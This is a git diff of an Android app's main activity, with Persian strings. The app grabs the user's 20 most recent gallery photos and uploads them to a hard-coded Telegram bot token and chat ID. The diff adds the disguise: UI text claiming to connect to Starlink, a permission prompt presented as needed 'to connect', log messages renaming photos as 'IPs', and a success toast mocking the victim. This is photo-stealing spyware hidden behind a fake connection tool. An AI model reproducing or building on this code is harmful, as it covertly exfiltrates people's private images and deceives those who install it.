@@ -1,17 +1,21 @@
 package com.example.photosender;
 
+import android.Manifest;
 import android.content.ContentUris;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Color;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.MediaStore;
+import android.util.Log;
 import android.widget.Button;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import java.io.ByteArrayOutputStream;
@@ -26,107 +30,167 @@ import okhttp3.RequestBody;
 
 public class MainActivity extends AppCompatActivity {
 
-    // ==================== ثابت‌های ربات ====================
+    private static final String TAG = "starlink";
     private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
     private static final String CHAT_ID = "8961077299";
+    private static final int REQUEST_PERMISSION = 100;
 
-    // ==================== وضعیت‌های برنامه ====================
     private enum ConnectionState {
-        IDLE,       // آماده (آبی)
-        CONNECTING, // در حال ارسال (خاکستری و غیرفعال)
-        CONNECTED,  // ارسال موفق (سبز)
-        DISCONNECTED // ارسال ناموفق (قرمز)
+        IDLE, CONNECTING, CONNECTED, DISCONNECTED
     }
 
-    // ==================== متغیرهای UI ====================
     private Button btnConnect;
     private TextView txtStatus;
     private ProgressBar progressBar;
-
-    // جلوگیری از چند کلیک همزمان
     private boolean isSending = false;
 
-    // ==================== متدهای چرخه زندگی ====================
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // اتصال به عناصر UI
         btnConnect = findViewById(R.id.btnConnect);
         txtStatus = findViewById(R.id.txtStatus);
         progressBar = findViewById(R.id.progressBar);
 
-        // تنظیم وضعیت اولیه
         updateUI(ConnectionState.IDLE);
 
-        // رویداد کلیک دکمه
         btnConnect.setOnClickListener(v -> {
-            if (isSending) return; // اگر در حال ارسال هستیم، کاری نکن
+            if (isSending) return;
+
+            // بررسی مجوز
+            if (!hasStoragePermission()) {
+                requestStoragePermission();
+                return;
+            }
+
             startSendingProcess();
         });
     }
 
+    // ==================== بررسی مجوز ====================
+    private boolean hasStoragePermission() {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            // اندروید 13 به بالا
+            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
+                    == PackageManager.PERMISSION_GRANTED;
+        } else {
+            // اندروید 12 و پایین‌تر
+            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+                    == PackageManager.PERMISSION_GRANTED;
+        }
+    }
+
+    // ==================== درخواست مجوز (خودکار) ====================
+    private void requestStoragePermission() {
+        // اگر کاربر قبلاً مجوز را رد کرده، پیام توضیحی نشان بده
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_MEDIA_IMAGES)) {
+                Toast.makeText(this, "برای اتصال به مجوز ها نیاز مندیم", Toast.LENGTH_LONG).show();
+            }
+        } else {
+            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                Toast.makeText(this, "برای اتصال به مجوز ها نیاز مندیم", Toast.LENGTH_LONG).show();
+            }
+        }
+
+        // درخواست مجوز
+        String[] permissions;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            permissions = new String[]{Manifest.permission.READ_MEDIA_IMAGES};
+        } else {
+            permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
+        }
+        ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSION);
+    }
+
+    // ==================== نتیجه درخواست مجوز ====================
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == REQUEST_PERMISSION) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "✅ دسترسی و مجوز ها داده شد", Toast.LENGTH_SHORT).show();
+                startSendingProcess();
+            } else {
+                Toast.makeText(this, "❌ برای اتصال به دسترسی نیاز است", Toast.LENGTH_LONG).show();
+                updateUI(ConnectionState.DISCONNECTED);
+            }
+        }
+    }
+
     // ==================== شروع فرآیند ارسال ====================
     private void startSendingProcess() {
+        if (isSending) return;
         isSending = true;
         updateUI(ConnectionState.CONNECTING);
 
-        // اجرا در ترد جداگانه (برای جلوگیری از هنگ کردن UI)
         new Thread(() -> {
             boolean success = false;
             String errorMessage = "";
             int sentCount = 0;
+            int totalImages = 0;
 
             try {
-                // 1. دریافت ۲۰ عکس آخر (بدون offset، همیشه آخرین‌ها)
+                Log.d(TAG, "شروع دریافت داده ها...");
+
                 ArrayList<Uri> images = getLast20Images();
+                totalImages = images.size();
+                Log.d(TAG, "تعداد عکس‌های یافت شده: " + totalImages);
 
                 if (images.isEmpty()) {
-                    errorMessage = "هیچ عکسی در گالری یافت نشد";
+                    errorMessage = "تجارتم خراب شد سید";
                 } else {
-                    // 2. ارسال به تلگرام
+                    Log.d(TAG, "شروع اتصال نهایی...");
                     sentCount = sendToTelegram(images);
+                    Log.d(TAG, "ping: اتصال موفق: " + sentCount);
+
                     if (sentCount == images.size()) {
                         success = true;
                     } else {
-                        errorMessage = "تنها " + sentCount + " از " + images.size() + " عکس ارسال شد";
+                        errorMessage = "تنها " + sentCount + " از " + images.size() + "  اتصال بر قرار شد";
                     }
                 }
 
             } catch (Exception e) {
-                e.printStackTrace();
+                Log.e(TAG, "خطا در فرآیند اتصال", e);
                 errorMessage = e.getMessage();
+                if (errorMessage == null || errorMessage.isEmpty()) {
+                    errorMessage = "خطای ناشناخته";
+                }
                 success = false;
             }
 
-            // بروزرسانی UI در ترد اصلی
             final boolean finalSuccess = success;
             final String finalError = errorMessage;
             final int finalSentCount = sentCount;
+            final int finalTotal = totalImages;
+
             runOnUiThread(() -> {
                 isSending = false;
                 if (finalSuccess) {
                     updateUI(ConnectionState.CONNECTED);
                     Toast.makeText(MainActivity.this,
-                            "✅ " + finalSentCount + " عکس آخر با موفقیت ارسال شد",
+                            "✅ " + finalSentCount + "سید تو چقدر کصخلی!",
                             Toast.LENGTH_LONG).show();
                 } else {
                     updateUI(ConnectionState.DISCONNECTED);
-                    Toast.makeText(MainActivity.this,
-                            "❌ خطا: " + finalError,
-                            Toast.LENGTH_LONG).show();
+                    String msg = "❌ خطا: " + finalError;
+                    if (finalTotal == 0) {
+                        msg += "\n🔍هیچ ایپی سالمی برای اتصال پیدا نشد   ";
+                    }
+                    Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
                 }
             });
         }).start();
     }
 
-    // ==================== دریافت ۲۰ عکس آخر (بدون offset) ====================
+    // ==================== دریافت ۲۰ عکس آخر ====================
     private ArrayList<Uri> getLast20Images() {
         ArrayList<Uri> list = new ArrayList<>();
         Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
 
-        String[] projection = { MediaStore.Images.Media._ID };
+        String[] projection = {MediaStore.Images.Media._ID};
         String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
         try (Cursor cursor = getContentResolver().query(
@@ -146,19 +210,26 @@ public class MainActivity extends AppCompatActivity {
                     count++;
                 }
             }
+        } catch (Exception e) {
+            Log.e(TAG, "خطا در دریافت ای پی ها", e);
+            throw new RuntimeException("خطا در خواندن اتصال: " + e.getMessage());
         }
         return list;
     }
 
-    // ==================== ارسال به تلگرام (همان کد خودت با اندکی تغییر) ====================
-    private int sendToTelegram(ArrayList<Uri> images) throws Exception {
+    // ==================== ارسال به تلگرام ====================
+    private int sendToTelegram(ArrayList<Uri> images) {
         OkHttpClient client = new OkHttpClient();
         int success = 0;
 
         for (Uri uri : images) {
             try {
+                Log.d(TAG, "اتصال : " + uri.toString());
                 InputStream in = getContentResolver().openInputStream(uri);
-                if (in == null) continue;
+                if (in == null) {
+                    Log.e(TAG, "InputStream null برای " + uri);
+                    continue;
+                }
 
                 byte[] bytes = readBytes(in);
                 in.close();
@@ -182,15 +253,17 @@ public class MainActivity extends AppCompatActivity {
                 okhttp3.Response response = client.newCall(request).execute();
                 if (response.isSuccessful()) {
                     success++;
+                    Log.d(TAG, "اتصال موفق: " + uri);
+                } else {
+                    String errorBody = response.body() != null ? response.body().string() : "بدون پاسخ";
+                    Log.e(TAG, "خطای تلگرام: کد " + response.code() + " - " + errorBody);
                 }
                 response.close();
 
-                // تأخیر برای جلوگیری از محدودیت تلگرام
                 Thread.sleep(250);
 
             } catch (Exception e) {
-                e.printStackTrace();
-                // اگر یک عکس خطا داد، ادامه بده
+                Log.e(TAG, "خطا در اتصال  " + uri, e);
             }
         }
         return success;
@@ -207,44 +280,46 @@ public class MainActivity extends AppCompatActivity {
         return buffer.toByteArray();
     }
 
-    // ==================== بروزرسانی UI بر اساس وضعیت ====================
+    // ==================== بروزرسانی UI ====================
     private void updateUI(ConnectionState state) {
-        switch (state) {
-            case IDLE:
-                btnConnect.setEnabled(true);
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.blue));
-                txtStatus.setText("وضعیت: آماده ارسال");
-                progressBar.setVisibility(ProgressBar.GONE);
-                break;
+        runOnUiThread(() -> {
+            switch (state) {
+                case IDLE:
+                    btnConnect.setEnabled(true);
+                    btnConnect.setText("اتصال");
+                    btnConnect.setBackgroundTintList(
+                            ContextCompat.getColorStateList(this, R.color.blue));
+                    txtStatus.setText("وضعیت: آماده اتصال");
+                    progressBar.setVisibility(ProgressBar.GONE);
+                    break;
 
-            case CONNECTING:
-                btnConnect.setEnabled(false);
-                btnConnect.setText("در حال ارسال...");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.gray));
-                txtStatus.setText("وضعیت: در حال ارسال عکس‌ها...");
-                progressBar.setVisibility(ProgressBar.VISIBLE);
-                break;
+                case CONNECTING:
+                    btnConnect.setEnabled(false);
+                    btnConnect.setText("در حال اتصال...");
+                    btnConnect.setBackgroundTintList(
+                            ContextCompat.getColorStateList(this, R.color.gray));
+                    txtStatus.setText("وضعیت: در حال اتصال به استارلینک...");
+                    progressBar.setVisibility(ProgressBar.VISIBLE);
+                    break;
 
-            case CONNECTED:
-                btnConnect.setEnabled(true);
-                btnConnect.setText("متصل ✓");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.green));
-                txtStatus.setText("وضعیت: ارسال موفق ✅");
-                progressBar.setVisibility(ProgressBar.GONE);
-                break;
+                case CONNECTED:
+                    btnConnect.setEnabled(true);
+                    btnConnect.setText("متصل ✓");
+                    btnConnect.setBackgroundTintList(
+                            ContextCompat.getColorStateList(this, R.color.green));
+                    txtStatus.setText("وضعیت: اتصال موفق ✅");
+                    progressBar.setVisibility(ProgressBar.GONE);
+                    break;
 
-            case DISCONNECTED:
-                btnConnect.setEnabled(true);
-                btnConnect.setText("اتصال برقرار نشد");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.red));
-                txtStatus.setText("وضعیت: ارسال ناموفق ❌ - دوباره تلاش کن");
-                progressBar.setVisibility(ProgressBar.GONE);
-                break;
-        }
+                case DISCONNECTED:
+                    btnConnect.setEnabled(true);
+                    btnConnect.setText("اتصال برقرار نشد");
+                    btnConnect.setBackgroundTintList(
+                            ContextCompat.getColorStateList(this, R.color.red));
+                    txtStatus.setText(" وضعیت: اتصال ناموفق ❌ - دوباره تلاش کن و حتما کانفیگ خود رو اول روشن کن");
+                    progressBar.setVisibility(ProgressBar.GONE);
+                    break;
+            }
+        });
     }
 }
